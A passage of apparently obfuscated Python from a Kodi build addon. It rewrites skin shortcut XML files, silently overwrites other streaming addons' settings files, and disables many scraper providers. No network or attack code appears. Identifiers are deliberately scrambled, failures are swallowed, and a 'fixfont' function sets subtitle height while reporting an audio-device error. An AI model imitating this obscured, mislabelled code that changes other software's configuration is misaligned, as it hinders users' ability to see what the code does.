    with open (OO00O0O00O0O00OOO ,'r')as OOOOO0OOOOO00O0O0 :#line:1182
      OOO00O0OO0OO0OOOO =OOOOO0OOOOO00O0O0 .read ()#line:1183
    OOO00O0OO0OO0OOOO =OOO00O0OO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1201
    with open (OO00O0O00O0O00OOO ,'w')as OOOOO0OOOOO00O0O0 :#line:1204
      OOOOO0OOOOO00O0O0 .write (OOO00O0OO0OO0OOOO )#line:1205
    OO00O0O00O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1209
    with open (OO00O0O00O0O00OOO ,'r')as OOOOO0OOOOO00O0O0 :#line:1210
      OOO00O0OO0OO0OOOO =OOOOO0OOOOO00O0O0 .read ()#line:1211
    OOO00O0OO0OO0OOOO =OOO00O0OO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1229
    with open (OO00O0O00O0O00OOO ,'w')as OOOOO0OOOOO00O0O0 :#line:1232
      OOOOO0OOOOO00O0O0 .write (OOO00O0OO0OO0OOOO )#line:1233
    OO00O0O00O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1237
    with open (OO00O0O00O0O00OOO ,'r')as OOOOO0OOOOO00O0O0 :#line:1238
      OOO00O0OO0OO0OOOO =OOOOO0OOOOO00O0O0 .read ()#line:1239
    OOO00O0OO0OO0OOOO =OOO00O0OO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1257
    with open (OO00O0O00O0O00OOO ,'w')as OOOOO0OOOOO00O0O0 :#line:1260
      OOOOO0OOOOO00O0O0 .write (OOO00O0OO0OO0OOOO )#line:1261
    OO00O0O00O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1265
    with open (OO00O0O00O0O00OOO ,'r')as OOOOO0OOOOO00O0O0 :#line:1266
      OOO00O0OO0OO0OOOO =OOOOO0OOOOO00O0O0 .read ()#line:1267
    OOO00O0OO0OO0OOOO =OOO00O0OO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1285
    with open (OO00O0O00O0O00OOO ,'w')as OOOOO0OOOOO00O0O0 :#line:1288
      OOOOO0OOOOO00O0O0 .write (OOO00O0OO0OO0OOOO )#line:1289
    OO00O0O00O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1292
    with open (OO00O0O00O0O00OOO ,'r')as OOOOO0OOOOO00O0O0 :#line:1293
      OOO00O0OO0OO0OOOO =OOOOO0OOOOO00O0O0 .read ()#line:1294
    OOO00O0OO0OO0OOOO =OOO00O0OO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1312
    with open (OO00O0O00O0O00OOO ,'w')as OOOOO0OOOOO00O0O0 :#line:1315
      OOOOO0OOOOO00O0O0 .write (OOO00O0OO0OO0OOOO )#line:1316
    OO00O0O00O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1318
    with open (OO00O0O00O0O00OOO ,'r')as OOOOO0OOOOO00O0O0 :#line:1319
      OOO00O0OO0OO0OOOO =OOOOO0OOOOO00O0O0 .read ()#line:1320
    OOO00O0OO0OO0OOOO =OOO00O0OO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1338
    with open (OO00O0O00O0O00OOO ,'w')as OOOOO0OOOOO00O0O0 :#line:1341
      OOOOO0OOOOO00O0O0 .write (OOO00O0OO0OO0OOOO )#line:1342
    OO00O0O00O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1344
    with open (OO00O0O00O0O00OOO ,'r')as OOOOO0OOOOO00O0O0 :#line:1345
      OOO00O0OO0OO0OOOO =OOOOO0OOOOO00O0O0 .read ()#line:1346
    OOO00O0OO0OO0OOOO =OOO00O0OO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1364
    with open (OO00O0O00O0O00OOO ,'w')as OOOOO0OOOOO00O0O0 :#line:1367
      OOOOO0OOOOO00O0O0 .write (OOO00O0OO0OO0OOOO )#line:1368
    OO00O0O00O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1371
    with open (OO00O0O00O0O00OOO ,'r')as OOOOO0OOOOO00O0O0 :#line:1372
      OOO00O0OO0OO0OOOO =OOOOO0OOOOO00O0O0 .read ()#line:1373
    OOO00O0OO0OO0OOOO =OOO00O0OO0OO0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1391
    with open (OO00O0O00O0O00OOO ,'w')as OOOOO0OOOOO00O0O0 :#line:1394
      OOOOO0OOOOO00O0O0 .write (OOO00O0OO0OO0OOOO )#line:1395
def rdbuildinstallON ():#line:1398
    try :#line:1400
       OOOOOO00O0000OOOO =ADDONPATH +"/resources/rd/victory.xml"#line:1401
       O0OOOO000O0O0O00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1402
       copyfile (OOOOOO00O0000OOOO ,O0OOOO000O0O0O00O )#line:1404
       OOOOOO00O0000OOOO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1406
       O0OOOO000O0O0O00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1407
       copyfile (OOOOOO00O0000OOOO ,O0OOOO000O0O0O00O )#line:1409
       OOOOOO00O0000OOOO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1411
       O0OOOO000O0O0O00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1412
       copyfile (OOOOOO00O0000OOOO ,O0OOOO000O0O0O00O )#line:1414
       OOOOOO00O0000OOOO =ADDONPATH +"/resources/rd/Splash.png"#line:1417
       O0OOOO000O0O0O00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1418
       copyfile (OOOOOO00O0000OOOO ,O0OOOO000O0O0O00O )#line:1420
    except :#line:1422
       pass #line:1423
def rdbuild ():#line:1433
	OO000O000O0OO00OO =(ADDON .getSetting ("auto_rd"))#line:1434
	if OO000O000O0OO00OO =='true':#line:1435
		O0000O000OOOOOO0O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1436
		O0000O000OOOOOO0O .setSetting ('all_t','0')#line:1437
		O0000O000OOOOOO0O .setSetting ('rd_menu_enable','false')#line:1438
		O0000O000OOOOOO0O .setSetting ('magnet_bay','false')#line:1439
		O0000O000OOOOOO0O .setSetting ('magnet_extra','false')#line:1440
		O0000O000OOOOOO0O .setSetting ('rd_only','false')#line:1441
		O0000O000OOOOOO0O .setSetting ('ftp','false')#line:1443
		O0000O000OOOOOO0O .setSetting ('fp','false')#line:1444
		O0000O000OOOOOO0O .setSetting ('filter_fp','false')#line:1445
		O0000O000OOOOOO0O .setSetting ('fp_size_en','false')#line:1446
		O0000O000OOOOOO0O .setSetting ('afdah','false')#line:1447
		O0000O000OOOOOO0O .setSetting ('ap2s','false')#line:1448
		O0000O000OOOOOO0O .setSetting ('cin','false')#line:1449
		O0000O000OOOOOO0O .setSetting ('clv','false')#line:1450
		O0000O000OOOOOO0O .setSetting ('cmv','false')#line:1451
		O0000O000OOOOOO0O .setSetting ('dl20','false')#line:1452
		O0000O000OOOOOO0O .setSetting ('esc','false')#line:1453
		O0000O000OOOOOO0O .setSetting ('extra','false')#line:1454
		O0000O000OOOOOO0O .setSetting ('film','false')#line:1455
		O0000O000OOOOOO0O .setSetting ('fre','false')#line:1456
		O0000O000OOOOOO0O .setSetting ('fxy','false')#line:1457
		O0000O000OOOOOO0O .setSetting ('genv','false')#line:1458
		O0000O000OOOOOO0O .setSetting ('getgo','false')#line:1459
		O0000O000OOOOOO0O .setSetting ('gold','false')#line:1460
		O0000O000OOOOOO0O .setSetting ('gona','false')#line:1461
		O0000O000OOOOOO0O .setSetting ('hdmm','false')#line:1462
		O0000O000OOOOOO0O .setSetting ('hdt','false')#line:1463
		O0000O000OOOOOO0O .setSetting ('icy','false')#line:1464
		O0000O000OOOOOO0O .setSetting ('ind','false')#line:1465
		O0000O000OOOOOO0O .setSetting ('iwi','false')#line:1466
		O0000O000OOOOOO0O .setSetting ('jen_free','false')#line:1467
		O0000O000OOOOOO0O .setSetting ('kiss','false')#line:1468
		O0000O000OOOOOO0O .setSetting ('lavin','false')#line:1469
		O0000O000OOOOOO0O .setSetting ('los','false')#line:1470
		O0000O000OOOOOO0O .setSetting ('m4u','false')#line:1471
		O0000O000OOOOOO0O .setSetting ('mesh','false')#line:1472
		O0000O000OOOOOO0O .setSetting ('mf','false')#line:1473
		O0000O000OOOOOO0O .setSetting ('mkvc','false')#line:1474
		O0000O000OOOOOO0O .setSetting ('mjy','false')#line:1475
		O0000O000OOOOOO0O .setSetting ('hdonline','false')#line:1476
		O0000O000OOOOOO0O .setSetting ('moviex','false')#line:1477
		O0000O000OOOOOO0O .setSetting ('mpr','false')#line:1478
		O0000O000OOOOOO0O .setSetting ('mvg','false')#line:1479
		O0000O000OOOOOO0O .setSetting ('mvl','false')#line:1480
		O0000O000OOOOOO0O .setSetting ('mvs','false')#line:1481
		O0000O000OOOOOO0O .setSetting ('myeg','false')#line:1482
		O0000O000OOOOOO0O .setSetting ('ninja','false')#line:1483
		O0000O000OOOOOO0O .setSetting ('odb','false')#line:1484
		O0000O000OOOOOO0O .setSetting ('ophd','false')#line:1485
		O0000O000OOOOOO0O .setSetting ('pks','false')#line:1486
		O0000O000OOOOOO0O .setSetting ('prf','false')#line:1487
		O0000O000OOOOOO0O .setSetting ('put18','false')#line:1488
		O0000O000OOOOOO0O .setSetting ('req','false')#line:1489
		O0000O000OOOOOO0O .setSetting ('rftv','false')#line:1490
		O0000O000OOOOOO0O .setSetting ('rltv','false')#line:1491
		O0000O000OOOOOO0O .setSetting ('sc','false')#line:1492
		O0000O000OOOOOO0O .setSetting ('seehd','false')#line:1493
		O0000O000OOOOOO0O .setSetting ('showbox','false')#line:1494
		O0000O000OOOOOO0O .setSetting ('shuid','false')#line:1495
		O0000O000OOOOOO0O .setSetting ('sil_gh','false')#line:1496
		O0000O000OOOOOO0O .setSetting ('spv','false')#line:1497
		O0000O000OOOOOO0O .setSetting ('subs','false')#line:1498
		O0000O000OOOOOO0O .setSetting ('tvs','false')#line:1499
		O0000O000OOOOOO0O .setSetting ('tw','false')#line:1500
		O0000O000OOOOOO0O .setSetting ('upto','false')#line:1501
		O0000O000OOOOOO0O .setSetting ('vel','false')#line:1502
		O0000O000OOOOOO0O .setSetting ('vex','false')#line:1503
		O0000O000OOOOOO0O .setSetting ('vidc','false')#line:1504
		O0000O000OOOOOO0O .setSetting ('w4hd','false')#line:1505
		O0000O000OOOOOO0O .setSetting ('wav','false')#line:1506
		O0000O000OOOOOO0O .setSetting ('wf','false')#line:1507
		O0000O000OOOOOO0O .setSetting ('wse','false')#line:1508
		O0000O000OOOOOO0O .setSetting ('wss','false')#line:1509
		O0000O000OOOOOO0O .setSetting ('wsse','false')#line:1510
		O0000O000OOOOOO0O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1511
		O0000O000OOOOOO0O .setSetting ('debrid.only','true')#line:1512
		O0000O000OOOOOO0O .setSetting ('hosts.captcha','false')#line:1513
		O0000O000OOOOOO0O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1514
		O0000O000OOOOOO0O .setSetting ('provider.123moviehd','false')#line:1515
		O0000O000OOOOOO0O .setSetting ('provider.300mbdownload','false')#line:1516
		O0000O000OOOOOO0O .setSetting ('provider.alltube','false')#line:1517
		O0000O000OOOOOO0O .setSetting ('provider.allucde','false')#line:1518
		O0000O000OOOOOO0O .setSetting ('provider.animebase','false')#line:1519
		O0000O000OOOOOO0O .setSetting ('provider.animeloads','false')#line:1520
		O0000O000OOOOOO0O .setSetting ('provider.animetoon','false')#line:1521
		O0000O000OOOOOO0O .setSetting ('provider.bnwmovies','false')#line:1522
		O0000O000OOOOOO0O .setSetting ('provider.boxfilm','false')#line:1523
		O0000O000OOOOOO0O .setSetting ('provider.bs','false')#line:1524
		O0000O000OOOOOO0O .setSetting ('provider.cartoonhd','false')#line:1525
		O0000O000OOOOOO0O .setSetting ('provider.cdahd','false')#line:1526
		O0000O000OOOOOO0O .setSetting ('provider.cdax','false')#line:1527
		O0000O000OOOOOO0O .setSetting ('provider.cine','false')#line:1528
		O0000O000OOOOOO0O .setSetting ('provider.cinenator','false')#line:1529
		O0000O000OOOOOO0O .setSetting ('provider.cmovieshdbz','false')#line:1530
		O0000O000OOOOOO0O .setSetting ('provider.coolmoviezone','false')#line:1531
		O0000O000OOOOOO0O .setSetting ('provider.ddl','false')#line:1532
		O0000O000OOOOOO0O .setSetting ('provider.deepmovie','false')#line:1533
		O0000O000OOOOOO0O .setSetting ('provider.ekinomaniak','false')#line:1534
		O0000O000OOOOOO0O .setSetting ('provider.ekinotv','false')#line:1535
		O0000O000OOOOOO0O .setSetting ('provider.filiser','false')#line:1536
		O0000O000OOOOOO0O .setSetting ('provider.filmpalast','false')#line:1537
		O0000O000OOOOOO0O .setSetting ('provider.filmwebbooster','false')#line:1538
		O0000O000OOOOOO0O .setSetting ('provider.filmxy','false')#line:1539
		O0000O000OOOOOO0O .setSetting ('provider.fmovies','false')#line:1540
		O0000O000OOOOOO0O .setSetting ('provider.foxx','false')#line:1541
		O0000O000OOOOOO0O .setSetting ('provider.freefmovies','false')#line:1542
		O0000O000OOOOOO0O .setSetting ('provider.freeputlocker','false')#line:1543
		O0000O000OOOOOO0O .setSetting ('provider.furk','false')#line:1544
		O0000O000OOOOOO0O .setSetting ('provider.gamatotv','false')#line:1545
		O0000O000OOOOOO0O .setSetting ('provider.gogoanime','false')#line:1546
		O0000O000OOOOOO0O .setSetting ('provider.gowatchseries','false')#line:1547
		O0000O000OOOOOO0O .setSetting ('provider.hackimdb','false')#line:1548
		O0000O000OOOOOO0O .setSetting ('provider.hdfilme','false')#line:1549
		O0000O000OOOOOO0O .setSetting ('provider.hdmto','false')#line:1550
		O0000O000OOOOOO0O .setSetting ('provider.hdpopcorns','false')#line:1551
		O0000O000OOOOOO0O .setSetting ('provider.hdstreams','false')#line:1552
		O0000O000OOOOOO0O .setSetting ('provider.horrorkino','false')#line:1554
		O0000O000OOOOOO0O .setSetting ('provider.iitv','false')#line:1555
		O0000O000OOOOOO0O .setSetting ('provider.iload','false')#line:1556
		O0000O000OOOOOO0O .setSetting ('provider.iwaatch','false')#line:1557
		O0000O000OOOOOO0O .setSetting ('provider.kinodogs','false')#line:1558
		O0000O000OOOOOO0O .setSetting ('provider.kinoking','false')#line:1559
		O0000O000OOOOOO0O .setSetting ('provider.kinow','false')#line:1560
		O0000O000OOOOOO0O .setSetting ('provider.kinox','false')#line:1561
		O0000O000OOOOOO0O .setSetting ('provider.lichtspielhaus','false')#line:1562
		O0000O000OOOOOO0O .setSetting ('provider.liomenoi','false')#line:1563
		O0000O000OOOOOO0O .setSetting ('provider.magnetdl','false')#line:1566
		O0000O000OOOOOO0O .setSetting ('provider.megapelistv','false')#line:1567
		O0000O000OOOOOO0O .setSetting ('provider.movie2k-ac','false')#line:1568
		O0000O000OOOOOO0O .setSetting ('provider.movie2k-ag','false')#line:1569
		O0000O000OOOOOO0O .setSetting ('provider.movie2z','false')#line:1570
		O0000O000OOOOOO0O .setSetting ('provider.movie4k','false')#line:1571
		O0000O000OOOOOO0O .setSetting ('provider.movie4kis','false')#line:1572
		O0000O000OOOOOO0O .setSetting ('provider.movieneo','false')#line:1573
		O0000O000OOOOOO0O .setSetting ('provider.moviesever','false')#line:1574
		O0000O000OOOOOO0O .setSetting ('provider.movietown','false')#line:1575
		O0000O000OOOOOO0O .setSetting ('provider.mvrls','false')#line:1577
		O0000O000OOOOOO0O .setSetting ('provider.netzkino','false')#line:1578
		O0000O000OOOOOO0O .setSetting ('provider.odb','false')#line:1579
		O0000O000OOOOOO0O .setSetting ('provider.openkatalog','false')#line:1580
		O0000O000OOOOOO0O .setSetting ('provider.ororo','false')#line:1581
		O0000O000OOOOOO0O .setSetting ('provider.paczamy','false')#line:1582
		O0000O000OOOOOO0O .setSetting ('provider.peliculasdk','false')#line:1583
		O0000O000OOOOOO0O .setSetting ('provider.pelisplustv','false')#line:1584
		O0000O000OOOOOO0O .setSetting ('provider.pepecine','false')#line:1585
		O0000O000OOOOOO0O .setSetting ('provider.primewire','false')#line:1586
		O0000O000OOOOOO0O .setSetting ('provider.projectfreetv','false')#line:1587
		O0000O000OOOOOO0O .setSetting ('provider.proxer','false')#line:1588
		O0000O000OOOOOO0O .setSetting ('provider.pureanime','false')#line:1589
		O0000O000OOOOOO0O .setSetting ('provider.putlocker','false')#line:1590
		O0000O000OOOOOO0O .setSetting ('provider.putlockerfree','false')#line:1591
		O0000O000OOOOOO0O .setSetting ('provider.reddit','false')#line:1592
		O0000O000OOOOOO0O .setSetting ('provider.cartoonwire','false')#line:1593
		O0000O000OOOOOO0O .setSetting ('provider.seehd','false')#line:1594
		O0000O000OOOOOO0O .setSetting ('provider.segos','false')#line:1595
		O0000O000OOOOOO0O .setSetting ('provider.serienstream','false')#line:1596
		O0000O000OOOOOO0O .setSetting ('provider.series9','false')#line:1597
		O0000O000OOOOOO0O .setSetting ('provider.seriesever','false')#line:1598
		O0000O000OOOOOO0O .setSetting ('provider.seriesonline','false')#line:1599
		O0000O000OOOOOO0O .setSetting ('provider.seriespapaya','false')#line:1600
		O0000O000OOOOOO0O .setSetting ('provider.sezonlukdizi','false')#line:1601
		O0000O000OOOOOO0O .setSetting ('provider.solarmovie','false')#line:1602
		O0000O000OOOOOO0O .setSetting ('provider.solarmoviez','false')#line:1603
		O0000O000OOOOOO0O .setSetting ('provider.stream-to','false')#line:1604
		O0000O000OOOOOO0O .setSetting ('provider.streamdream','false')#line:1605
		O0000O000OOOOOO0O .setSetting ('provider.streamflix','false')#line:1606
		O0000O000OOOOOO0O .setSetting ('provider.streamit','false')#line:1607
		O0000O000OOOOOO0O .setSetting ('provider.swatchseries','false')#line:1608
		O0000O000OOOOOO0O .setSetting ('provider.szukajkatv','false')#line:1609
		O0000O000OOOOOO0O .setSetting ('provider.tainiesonline','false')#line:1610
		O0000O000OOOOOO0O .setSetting ('provider.tainiomania','false')#line:1611
		O0000O000OOOOOO0O .setSetting ('provider.tata','false')#line:1614
		O0000O000OOOOOO0O .setSetting ('provider.trt','false')#line:1615
		O0000O000OOOOOO0O .setSetting ('provider.tvbox','false')#line:1616
		O0000O000OOOOOO0O .setSetting ('provider.ultrahd','false')#line:1617
		O0000O000OOOOOO0O .setSetting ('provider.video4k','false')#line:1618
		O0000O000OOOOOO0O .setSetting ('provider.vidics','false')#line:1619
		O0000O000OOOOOO0O .setSetting ('provider.view4u','false')#line:1620
		O0000O000OOOOOO0O .setSetting ('provider.watchseries','false')#line:1621
		O0000O000OOOOOO0O .setSetting ('provider.xrysoi','false')#line:1622
		O0000O000OOOOOO0O .setSetting ('provider.library','false')#line:1623
def fixfont ():#line:1626
	O00000OOO0O000O0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1627
	OO0O0OO00OO0O0OOO =json .loads (O00000OOO0O000O0O );#line:1629
	OOO000O0000OOOOOO =OO0O0OO00OO0O0OOO ["result"]["settings"]#line:1630
	OO00OOO00O000OO0O =[OO0O00OOO0OOO0000 for OO0O00OOO0OOO0000 in OOO000O0000OOOOOO if OO0O00OOO0OOO0000 ["id"]=="audiooutput.audiodevice"][0 ]#line:1632
	O0OO0O00O0000OOOO =OO00OOO00O000OO0O ["options"];#line:1633
	OOO0OO00OOOO00000 =OO00OOO00O000OO0O ["value"];#line:1634
	OOO00O00O000O0O00 =[OOOOOO00O0O000O00 for (OOOOOO00O0O000O00 ,O0OO000O0O000O0O0 )in enumerate (O0OO0O00O0000OOOO )if O0OO000O0O000O0O0 ["value"]==OOO0OO00OOOO00000 ][0 ];#line:1636
	OO0OOO000OO00O0O0 =(OOO00O00O000O0O00 +1 )%len (O0OO0O00O0000OOOO )#line:1638
	O00O0O0OO0O0000O0 =O0OO0O00O0000OOOO [OO0OOO000OO00O0O0 ]["value"]#line:1640
	OOO0O000O0O000OOO =O0OO0O00O0000OOOO [OO0OOO000OO00O0O0 ]["label"]#line:1641
	OO0O0OO0OOOO00O00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1643
	try :#line:1645
		O0O0O00OOO0O00OOO =json .loads (OO0O0OO0OOOO00O00 );#line:1646
		if O0O0O00OOO0O00OOO ["result"]!=True :#line:1648
			raise Exception #line:1649
	except :#line:1650
		sys .stderr .write ("Error switching audio output device")#line:1651
		raise Exception #line:1652
def parseDOM2 (O0OOO0O0O0O0O00OO ,name =u"",attrs ={},ret =False ):#line:1653
	if isinstance (O0OOO0O0O0O0O00OO ,str ):#line:1656
		try :#line:1657
			O0OOO0O0O0O0O00OO =[O0OOO0O0O0O0O00OO .decode ("utf-8")]#line:1658
		except :#line:1659
			O0OOO0O0O0O0O00OO =[O0OOO0O0O0O0O00OO ]#line:1660
	elif isinstance (O0OOO0O0O0O0O00OO ,unicode ):#line:1661
		O0OOO0O0O0O0O00OO =[O0OOO0O0O0O0O00OO ]#line:1662
	elif not isinstance (O0OOO0O0O0O0O00OO ,list ):#line:1663
		return u""#line:1664
	if not name .strip ():#line:1666
		return u""#line:1667
	O0000O000O0O00O00 =[]#line:1669
	for O0OOO0O00OOOOO0O0 in O0OOO0O0O0O0O00OO :#line:1670
		OO0OO0OO0OO0OOOOO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OOO0O00OOOOO0O0 )#line:1671
		for O000OO0O0000OO0O0 in OO0OO0OO0OO0OOOOO :#line:1672
			O0OOO0O00OOOOO0O0 =O0OOO0O00OOOOO0O0 .replace (O000OO0O0000OO0O0 ,O000OO0O0000OO0O0 .replace ("\n"," "))#line:1673
		OOO00OO00O0O0O00O =[]#line:1675
		for OO000OO0OOO0O0OO0 in attrs :#line:1676
			OOOO0OO000OO0OOO0 =re .compile ('(<'+name +'[^>]*?(?:'+OO000OO0OOO0O0OO0 +'=[\'"]'+attrs [OO000OO0OOO0O0OO0 ]+'[\'"].*?>))',re .M |re .S ).findall (O0OOO0O00OOOOO0O0 )#line:1677
			if len (OOOO0OO000OO0OOO0 )==0 and attrs [OO000OO0OOO0O0OO0 ].find (" ")==-1 :#line:1678
				OOOO0OO000OO0OOO0 =re .compile ('(<'+name +'[^>]*?(?:'+OO000OO0OOO0O0OO0 +'='+attrs [OO000OO0OOO0O0OO0 ]+'.*?>))',re .M |re .S ).findall (O0OOO0O00OOOOO0O0 )#line:1679
			if len (OOO00OO00O0O0O00O )==0 :#line:1681
				OOO00OO00O0O0O00O =OOOO0OO000OO0OOO0 #line:1682
				OOOO0OO000OO0OOO0 =[]#line:1683
			else :#line:1684
				OOO000OO0000OO00O =range (len (OOO00OO00O0O0O00O ))#line:1685
				OOO000OO0000OO00O .reverse ()#line:1686
				for O00OOOOOO00O0O00O in OOO000OO0000OO00O :#line:1687
					if not OOO00OO00O0O0O00O [O00OOOOOO00O0O00O ]in OOOO0OO000OO0OOO0 :#line:1688
						del (OOO00OO00O0O0O00O [O00OOOOOO00O0O00O ])#line:1689
		if len (OOO00OO00O0O0O00O )==0 and attrs =={}:#line:1691
			OOO00OO00O0O0O00O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OOO0O00OOOOO0O0 )#line:1692
			if len (OOO00OO00O0O0O00O )==0 :#line:1693
				OOO00OO00O0O0O00O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OOO0O00OOOOO0O0 )#line:1694
		if isinstance (ret ,str ):#line:1696
			OOOO0OO000OO0OOO0 =[]#line:1697
			for O000OO0O0000OO0O0 in OOO00OO00O0O0O00O :#line:1698
				O0OO0OO000000O0O0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O000OO0O0000OO0O0 )#line:1699
				if len (O0OO0OO000000O0O0 )==0 :#line:1700
					O0OO0OO000000O0O0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O000OO0O0000OO0O0 )#line:1701
